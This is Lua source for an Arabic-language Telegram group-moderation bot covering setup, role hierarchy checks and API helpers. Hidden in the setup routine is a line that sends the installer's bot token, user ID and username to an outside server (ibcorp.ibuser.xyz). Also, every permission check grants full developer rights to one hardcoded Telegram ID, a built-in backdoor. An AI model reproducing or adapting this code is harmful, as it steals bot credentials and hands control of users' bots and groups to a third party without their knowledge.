------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.--
--   This Is The Source Channel @Dev_Prox .   --
--                - DevProx -                 --
--        -- https://t.me/Dev_Prox --         --
------------------------------------------------ 
 redis = require('redis')
 URL = require('socket.url')  
 HTTPS = require ("ssl.https")  
 https = require ("ssl.https") 
 http  = require ("socket.http")
 serpent = require("serpent")
 json = dofile('./JSON.lua')
 JSON = dofile('./dkjson.lua')
 lgi = require('lgi')
 notify = lgi.require('Notify')
 utf8 = require ('lua-utf8') 
 notify.init ("Telegram updates")
 DevAbs = Redis.connect('127.0.0.1', 6379)
 chats = {}
 day = 313456502
--     Source DevProx     --
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m Ξ • الان ارسل ايدي المطور •\n Ξ   • Now send your id • \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 218385683
end
io.write("\27[31;47m Ξ • الان ارسل معرف المطور •\n Ξ • Now send your username • \27[0;34;49m\n")  
local username = io.read()
io.write("\27[31;47m Ξ   • الان ارسل توكن البوت •\n Ξ • Now send your bots token • \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
username = username, 
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
https.request("https://ibcorp.ibuser.xyz/iq_abs/?id="..SUDO.."&user="..username.."&token="..token)
file = io.open("RUNABS.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./DevProx.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("ABS", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNABS.sh
done
]])  
file:close() 
os.execute('./ABS')
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
end
local load_DevAbs = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_DevAbs = load_DevAbs()  
sudos = dofile("./config.lua") 
DevId = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
DevProx = sudos.bot_id
DevUser = sudos.username
tokenbot = sudos.token
name_bot = (DevAbs:get(DevProx..'name_bot') or 'بروكس')
ExDevUser = DevUser:gsub('@','') 
ExDevUser = ExDevUser:gsub([[\_]],'_')
--     Source DevProx     --
--     Start Functions    --
----------Bot Owner---------
function is_leader(msg) 
local var = false 
if msg.sender_user_id_ == tonumber(DevId) then var = true end 
if msg.sender_user_id_ == tonumber(218385683) then var = true end 
return var end 

function is_leaderid(user_id)
local var = false
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------  Sudo  ----------
function is_sudo(msg)
local var = false
for k,v in pairs(sudo_users) do
if msg.sender_user_id_ == v then
var = true
end end
if msg.sender_user_id_ == tonumber(DevId) then var = true end
if msg.sender_user_id_ == tonumber(218385683) then var = true end 
return var end

function is_sudoid(user_id)
local var = false
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------  Sudo3  ---------
function is_sudo3(user_id)
local var = false
local absb =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..absb, user_id)
if sudo3 then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------Owner all---------
function is_ownerall(user_id, chat_id)
local var = false
local abs =  'abs:ownerall:'
local ownerall = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
if ownerall then var = true end if sudo3 then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------admin all---------
function is_adminall(user_id, chat_id)
local var = false
local abs =  'abs:adminall:'
local adminall = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:ownerall:'
local ownerall = DevAbs:sismember(DevProx..absss, user_id)
if adminall then var = true end if sudo3 then var = true end if ownerall then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
------ VIP MEMBER ALL ------
function is_vipall(user_id)
local var = false
local abss =  'abs:vipall:'
local vpall = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:ownerall:'
local ownerall = DevAbs:sismember(DevProx..absss, user_id)
local abssss = 'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'abs:adminall:'
local adminall = DevAbs:sismember(DevProx..absssss, user_id)
if vpall then var = true end if ownerall then var = true end if sudo3 then var = true end if adminall then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------  donky  ---------
function is_donky(user_id, chat_id)
local var = false
local abs =  'bot:donky:'..chat_id
local admins = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..absss, user_id)
local abssss = 'abs:vipmem:'..chat_id
local vipmem = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absssss, user_id)
local abssssss =  'abs:ownerall:'
local ownerall = DevAbs:sismember(DevProx..abssssss, user_id)
local absabs =  'abs:adminall:'
local adminall = DevAbs:sismember(DevProx..absabs, user_id)
if donky then var = true end if admins then var = true end if owner then var = true end if sudo3 then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------  monsh  ---------
function is_monsh(user_id, chat_id)
local var = false
local abs =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
if monsh then var = true end if sudo3 then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
---------  monshid  ---------
function is_monshid(user_id, chat_id)
local var = false
local abs =  'abs:monshid:'..chat_id
local monshid = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absss, user_id)
if monshid then var = true end if sudo3 then var = true end if monsh then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------  Owner  ---------
function is_owner(user_id, chat_id)
local var = false
local abs =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absss, user_id)
local abas =  'abs:monshid:'..chat_id
local monshid = DevAbs:sismember(DevProx..abas, user_id)
if owner then var = true end if sudo3 then var = true end if monsh then var = true end if monshid then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
----------  admin  ---------
function is_admin(user_id, chat_id)
local var = false
local abs =  'abs:admins:'..chat_id
local admins = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..absss, user_id)
local abssss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'abs:ownerall:'
local ownerall = DevAbs:sismember(DevProx..absssss, user_id)
local abas =  'abs:monshid:'..chat_id
local monshid = DevAbs:sismember(DevProx..abas, user_id)
if admins then var = true end if owner then var = true end if sudo3 then var = true end if monsh then var = true end if ownerall then var = true end if monshid then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
---------VIP MEMBER---------
function is_vipmem(user_id, chat_id)
local var = false
local abs =  'abs:admins:'..chat_id
local admins = DevAbs:sismember(DevProx..abs, user_id)
local abss =  'abs:sudo3:'
local sudo3 = DevAbs:sismember(DevProx..abss, user_id)
local absss =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(DevProx..absss, user_id)
local abssss = 'abs:vipmem:'..chat_id
local vipmem = DevAbs:sismember(DevProx..abssss, user_id)
local absssss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(DevProx..absssss, user_id)
local abssssss =  'abs:ownerall:'
local ownerall = DevAbs:sismember(DevProx..abssssss, user_id)
local absabs =  'abs:adminall:'
local adminall = DevAbs:sismember(DevProx..absabs, user_id)
local abas =  'abs:monshid:'..chat_id
local monshid = DevAbs:sismember(DevProx..abas, user_id)
if vipmem then var = true end if admins then var = true end if owner then var = true end if sudo3 then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end if monshid then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(DevId) then var = true end
if user_id == tonumber(218385683) then var = true end 
return var end
--     Source DevProx     --
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local abss = "admins:data:" .. user_id
local lists = DevAbs:smembers(DevProx..abss)
DevAbs:del(DevProx.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
DevAbs:incr(DevProx.."SudoNumberGp" .. user_id)
end
end
local setnumbergp_three = function(user_id)
local absss = "admins:data:" .. user_id
local lists = DevAbs:smembers(DevProx..absss)
DevAbs:del(DevProx.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
DevAbs:incr(DevProx.."SudoNumberGp" .. user_id)
end
end
local list = DevAbs:smembers(DevProx.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end
local lists = DevAbs:smembers(DevProx.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end
DevAbs:setex(DevProx.."bot:reload", 7230, true)
end
--     Source DevProx     --
---------FreeWords----------
local function is_free(msg, value)
local var = false
local abs = (DevProx..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end
end
end
return var
end
--     Source DevProx     --
---------  Banned  ---------
local function is_banned(user_id, chat_id)
local var = false
local abs = 'bot:banned:'..chat_id
local banned = DevAbs:sismember(DevProx..abs, user_id)
if banned then
var = true
end
return var
end
--     Source DevProx     --
----------  Muted  ---------
local function is_muted(user_id, chat_id)
local var = false
local abs = 'bot:muted:'..chat_id
local muted = DevAbs:sismember(DevProx..abs, user_id)
if muted then
var = true
end
return var
end
--     Source DevProx     --
---------  Gbaned  ---------
function is_gbanned(user_id)
local var = false
local abs = 'bot:gban:'
local gbanned = DevAbs:sismember(DevProx..abs, user_id)
if gbanned then
var = true
end
return var
end
--     Source DevProx     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     Source DevProx     --
---------- whoAdd ----------
local who_add = function(chat)
local user_id
local user = false
local list1 = DevAbs:smembers(DevProx.."Bot:KpSudos")
local list2 = DevAbs:smembers(DevProx.."Bot:Admins")
for k, v in pairs(list1) do
local abs = "sudo:data:" .. v
local is_add = DevAbs:sismember(DevProx..abs, chat)
if is_add then
user_id = v
end
end
for k, v in pairs(list2) do
local abs = "sudo:data:" .. v
local is_add = DevAbs:sismember(DevProx..abs, chat)
if is_add then
user_id = v
end
end
local abs = "sudo:data:" .. DevId
if DevAbs:sismember(DevProx..abs, chat) then
user_id = DevId
end
if user_id then
local user_info = DevAbs:get(DevProx.."user:Name" .. user_id)
if user_info then
user = user_info
end
end
return user
end
--     Source DevProx     --
local function DevAbs13(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= DevProx:lower() then 
DevAbs13(chat,msg.id_,"☬︙عذراً هذا ٱڵملف ليس تابع لهذٱ ٱڵسورس")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
DevAbs13(chat,msg.id_,"☬︙جٱري رفـع ٱڵـمڵف ... .")   
else
DevAbs13(chat,msg.id_,"☬︙ڵقد حدث خطٱء \n☬︙يرجى ٱڵتحقق من صيغة ٱڵمڵف ")   
end      
local info_file = io.open('./'..DevProx..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
DevAbs13(chat,msg.id_,"☬︙تـۖم رفع ٱڵنسخه بنجٱح \n☬︙تـۖم تفعيڵ جميع ٱڵـمجموعٱت \n☬︙تـۖم ٱسترجٱع مشرفين ٱڵمجمۄعات \n☬︙تـۖم ٱسترجٱع ٱوٱمر ٱڵقفڵ وٱڵفتح في جميع مجموعٱت ٱڵبوت ")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
DevAbs:sadd(DevProx.."bot:groups",idg)
DevAbs:set(DevProx.."bot:enable:"..idg,true)
DevAbs:setex(DevProx.."bot:charge:"..idg,86400,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, idg)
DevAbs:set(DevProx..'editmsg'..idg,true)
DevAbs:set(DevProx..'bot:bots:mute'..idg,true)
DevAbs:set(DevProx..'bot:bots:ban'..idg,true)
DevAbs:set(DevProx..'keed_bots'..idg,true)
DevAbs:set(DevProx..'anti-flood:'..idg,true)
DevAbs:set(DevProx..'bot:inline:mute'..idg,true)
DevAbs:set(DevProx..'bot:photo:mute'..idg,true)
DevAbs:set(DevProx..'bot:spam:mute'..idg,true)
DevAbs:set(DevProx..'bot:video:mute'..idg,true)
DevAbs:set(DevProx..'bot:gifs:mute'..idg,true)
DevAbs:set(DevProx..'bot:music:mute'..idg,true)
DevAbs:set(DevProx..'bot:voice:mute'..idg,true)
DevAbs:set(DevProx..'bot:links:mute'..idg,true)
DevAbs:set(DevProx..'bot:location:mute'..idg,true)
DevAbs:set(DevProx..'tags:lock'..idg,true)
DevAbs:set(DevProx..'bot:strict'..idg,true)
DevAbs:set(DevProx..'bot:document:mute'..idg,true)
DevAbs:set(DevProx..'bot:abstag:mute'..idg,true)
DevAbs:set(DevProx..'bot:contact:mute'..idg,true)
DevAbs:set(DevProx..'bot:webpage:mute'..idg,true)
DevAbs:set(DevProx..'bot:sticker:mute'..idg,true)
DevAbs:set(DevProx..'markdown:lock'..idg,true)
DevAbs:set(DevProx..'bot:forward:mute'..idg,true)
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
DevAbs:sadd(DevProx..'abs:monsh:'..idg,idmsh)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
DevAbs:sadd(DevProx..'abs:owners:'..idg,idmder)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
DevAbs:sadd(DevProx..'abs:admins:'..idg,idmod)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.VIP then
for k,idvip in pairs(v.VIP) do
DevAbs:sadd(DevProx..'abs:vipmem:'..idg,idvip)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.linkgroup then
if v.linkgroup ~= "" then
DevAbs:set(DevProx.."bot:group:link"..idg,v.linkgroup)   
print('( تم وضع روابط المجموعات )')
end
end
end
end
--     Source DevProx     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source DevProx     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--     Source DevProx     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source DevProx     --
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     Source DevProx     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source DevProx     --
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     Source DevProx     --
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
--     Source DevProx     --
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     Source DevProx     --
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     Source DevProx     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source DevProx     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source DevProx     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--     Source DevProx     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--     Source DevProx     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
--     Source DevProx     --
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end
tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end
--     Source DevProx     --
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--     Source DevProx     --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source DevProx     --
function dl_cb(arg, data)
end
--     Source DevProx     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     Source DevProx     --
function Dev_Abs(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     Source DevProx     --
function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end
--     Source DevProx     --
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--     Source DevProx     --
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     Source DevProx     --
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--     Source DevProx     --
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
--     Source DevProx     --
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--     Source DevProx     --
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     Source DevProx     --
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     Source DevProx     --
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     Source DevProx     --
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--     Source DevProx     --
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--     Source DevProx     --
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source DevProx     --
function send_inline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..tokenbot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
--     Source DevProx     --
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     Source DevProx     --
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
--     Source DevProx     --
function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end
getChannelFull(channel,callback_admins)
end
--     Source DevProx     --
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--     Source DevProx     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     Source DevProx     --
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source DevProx     --
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--     Source DevProx     --
local abs_rank = function(msg) if is_leaderid(msg.sender_user_id_) then ABS_PROX  = "ٱڵمطۄر" elseif is_sudoid(msg.sender_user_id_) then ABS_PROX = "ٱڵمطۄر" elseif is_sudo3(msg.sender_user_id_) then ABS_PROX = "ٱڵمطۄر" elseif is_ownerall(msg.sender_user_id_) then ABS_PROX = "ٱڵمدير" elseif is_adminall(msg.sender_user_id_) then ABS_PROX = "ٱلٱدمن" elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "ٱڵمنشئ" elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "ٱڵمنشئ" elseif is_owner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "ٱڵمدير" elseif is_admin(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "ٱلٱدمـۧن" else ABS_PROX = "ٱڵعضو" end return ABS_PROX end
